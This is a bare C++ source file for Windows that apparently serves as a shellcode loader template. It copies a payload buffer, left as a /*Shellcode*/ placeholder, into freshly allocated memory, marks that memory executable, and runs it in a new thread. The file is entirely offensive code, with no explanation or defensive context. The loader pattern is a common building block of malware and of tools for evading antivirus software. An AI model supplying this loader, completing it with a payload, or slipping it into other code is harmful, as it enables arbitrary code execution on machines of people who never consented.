#include <windows.h>
#include <iostream>

unsigned char buf[] = /*Shellcode*/;
unsigned int payload_len = sizeof(buf);

int main() {
    
    void* memory;
    HANDLE rThread;
    DWORD out = 0;
    BOOL protect;
    
    memory = VirtualAlloc(NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(memory, buf, payload_len);

    protect = VirtualProtect(memory, payload_len, PAGE_EXECUTE, &out);

    if (protect != 0) {
        rThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0, NULL);
        WaitForSingleObject(rThread, INFINITE);
    }

    return 0;
}
